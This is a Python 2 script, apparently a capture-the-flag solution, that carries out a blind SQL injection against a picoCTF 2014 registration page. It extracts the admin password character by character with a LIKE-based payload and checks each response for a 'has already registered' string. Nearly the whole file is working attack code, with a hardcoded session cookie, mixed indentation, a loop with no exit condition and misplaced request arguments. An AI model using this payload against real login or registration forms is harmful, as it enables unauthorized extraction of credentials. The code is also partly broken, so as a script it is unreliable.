import string, requests

all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

password = ''

target = 'http://web2014.picoctf.com/injection4/register.php'

# Cookies 
cookieName1 = 'PHPSESSID'
cookieValue1 = '08qljodbvhon48vlqt32q5k4u2'
cookies = {cookieName1: cookieValue1}

referer = 'https://www.hackthissite.org/missions/prog/2/'

# Headers
headers = {'Referer': referer}

# String that says whether we're good
exists = 'has already registered'

# Verifying we can connect
req = requests.get(target, cookies=cookies)

if req.status_code != requests.codes.ok:
	raise ValueError('Poof! Unable to connect to target :(')
else:
	print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
while True:
	print password
	for c in all_chars:
		# SQL LIKE brute-forcing injection
		data = {'username':"admin' AND PASSWORD LIKE '" + password + c + "%'-- "}
		r = requests.post(target, data, cookies, headers).text
        	if exists in r:
            		password = password + c
            		break

print '[*] Successfully brute forced password.'

